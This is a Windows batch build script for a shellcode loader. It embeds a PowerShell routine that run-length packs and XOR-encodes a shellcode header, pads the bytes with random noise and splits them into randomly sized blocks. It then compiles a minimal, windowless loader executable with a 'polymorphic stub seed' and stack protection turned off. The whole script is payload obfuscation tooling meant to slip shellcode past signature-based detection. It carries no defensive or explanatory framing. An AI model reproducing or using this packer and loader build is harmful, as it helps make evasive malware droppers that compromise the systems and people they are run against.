@echo off
setlocal

rem Ensure the Visual Studio build tools environment is loaded (run from a Developer Command Prompt).
where cl >nul 2>&1
if errorlevel 1 (
    echo [build] cl.exe not found. Please run this from a "x64 Native Tools Command Prompt for VS".
    exit /b 1
)

for %%i in ("%~dp0..") do set ROOT=%%~fi
set OUTDIR=%ROOT%\build_artifacts
if not exist "%OUTDIR%" mkdir "%OUTDIR%"
set SRC=%ROOT%\loaders\simple_loader-minified.c
set OUT=%OUTDIR%\simple_loader-minified.exe
set OUTOBJ=%OUTDIR%\simple_loader-minified.obj
set SHELLCODE=%ROOT%\shellcode.h
set SCRAMBLED=%ROOT%\shellcode_scrambled.h
set DEFINES=/D shellcode=patched_bin /D shellcode_len=patched_bin_len

if not exist "%SHELLCODE%" (
    echo [build] ERROR: shellcode.h not found at %SHELLCODE%
    exit /b 1
)

set KEY=41
for /f "usebackq tokens=*" %%i in (`powershell -NoProfile -Command "Get-Random -Minimum 0 -Maximum 0xFFFFFFFF | ForEach-Object { '{0:X8}' -f $_ }"`) do set SEED=%%i
if "%SEED%"=="" set SEED=ff050281
echo [build] Scrambling shellcode.h with XOR key 0x%KEY%
powershell -NoProfile -Command ^
  "$k=0x%KEY%;$raw=Get-Content -Raw '%SHELLCODE%';$matches=[regex]::Matches($raw,'0x([0-9A-Fa-f]{2})');$bytes=New-Object System.Collections.Generic.List[byte];foreach($m in $matches){$bytes.Add([Convert]::ToByte($m.Groups[1].Value,16))};if($bytes.Count -eq 0){Write-Error 'shellcode.h contained no bytes (did you generate it?)'; exit 1};$origLen=$bytes.Count;$packed=New-Object System.Collections.Generic.List[byte];for($i=0;$i -lt $origLen;){$val=$bytes[$i];$count=1;while(($i + $count) -lt $origLen -and $bytes[$i+$count] -eq $val -and $count -lt 255){$count++};$packed.Add([byte]$count);$packed.Add([byte]$val);$i += $count};$packed = $packed | ForEach-Object { [byte]($_ -bxor $k) };$packedLen=$packed.Count;if($packedLen -eq 0){Write-Error 'scramble produced empty output'; exit 1};$idx=0;$blockIdx=0;$blockDefs=@();$sizeList=@();while($idx -lt $packedLen){$remain=$packedLen-$idx;$chunk=[Math]::Min($remain,(Get-Random -Minimum 64 -Maximum 192));$list=New-Object System.Collections.Generic.List[string];for($i=0;$i -lt $chunk;$i++){ $noise=Get-Random -Minimum 0 -Maximum 256; $list.Add('0x{0:X2}' -f $noise); $list.Add('0x{0:X2}' -f $packed[$idx+$i]); } $body=($list -join ', ');$lines=[regex]::Replace($body,'((?:[^,]+, ){15}[^,]+), ','$1,' + [environment]::NewLine + '  ');$blockDefs += \"static const unsigned char patched_block$blockIdx[] = {`n  $lines`n};\"; $sizeList += $list.Count; $idx += $chunk; $blockIdx++; } $ptrs = 'static const unsigned char *patched_blocks[] = { ' + ((0..($blockIdx-1) | ForEach-Object { 'patched_block{0}' -f $_ }) -join ', ') + ' };'; $sizes = 'static const unsigned int patched_block_sizes[] = { ' + ($sizeList -join ', ') + ' };'; $header = \"/* scrambled blocks with noise, RLE+XOR packed */`nunsigned int patched_bin_len = $origLen;`n#define SHELLCODE_BLOCKED 1`n#define SHELLCODE_BLOCK_COUNT $blockIdx`n#define SHELLCODE_PAD_STRIDE 2`n#define SHELLCODE_PAD_OFFSET 1`n#define SHELLCODE_PACKED_LEN $packedLen`n#define SHELLCODE_ORIG_LEN $origLen`n\" + ($blockDefs -join \"`n\") + \"`n$ptrs`n$sizes`n\"; Set-Content -NoNewline -Encoding ASCII '%SCRAMBLED%' $header" || exit /b 1
set DEFINES=%DEFINES% /D SHELLCODE_HEADER=\"shellcode_scrambled.h\" /D SHELLCODE_KEY=0x%KEY% /D SHELLCODE_SCRAMBLED=1 /D SHELLCODE_SEED=0x%SEED%
echo [build] Using polymorphic stub seed 0x%SEED%

echo [build] Compiling %SRC% -> %OUT%
cl /nologo /Os /GS- /GR- /W3 /Zl /Gy %DEFINES% /I "%ROOT%" /Fo:%OUTOBJ% /Fe:%OUT% %SRC% ^
  /link /NODEFAULTLIB:libcmt /ENTRY:MyEntry /SUBSYSTEM:WINDOWS ^
  /OPT:REF /OPT:ICF /INCREMENTAL:NO /MERGE:.rdata=.text /MERGE:.pdata=.text /ALIGN:16 /IGNORE:4108 ^
  kernel32.lib
if errorlevel 1 exit /b 1

echo [build] Done.
exit /b 0
